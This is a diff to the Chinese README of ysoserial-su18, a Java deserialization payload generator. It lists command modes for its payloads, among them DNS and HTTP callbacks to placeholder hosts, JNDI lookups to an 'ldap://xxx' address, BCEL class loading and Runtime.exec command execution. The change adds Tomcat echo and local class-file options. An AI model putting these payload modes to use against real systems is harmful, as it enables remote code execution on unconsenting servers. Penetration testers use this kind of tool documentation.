@@ -219,7 +219,7 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 - DL ：DNS LOG - 通过 `InetAddress.getAllByName()` 来触发 DNS 解析，使用命令 `DL-xxxdnslog.cn`
 - HL ：HTTP LOG - 通过 `URL.getContent()` 来触发 HTTP LOG，使用命令 `HL-http://xxx.com`
 - BC ：BCEL Classloader - 通过 `..bcel...ClassLoader.loadClass().newInstance()` 来加载 BCEL
-  类字节码，使用命令 `BC-$BCEL$xxx`
+  类字节码，使用命令 `BC-$BCEL$xxx`，也可以使用 `BC-EX-TomcatEcho` 或 `BC-LF-/tmp/aaa.class` 来执行高级功能
 - JD ：JNDI Lookup - 通过 `InitialContext.lookup()` 来触发 JNDI 注入，使用命令 `JD-ldap://xxx/xx`
 - 其他：普通命令执行 - 通过 `Runtime.getRuntime().exec()` 执行系统命令，使用命令 `whoami`
 
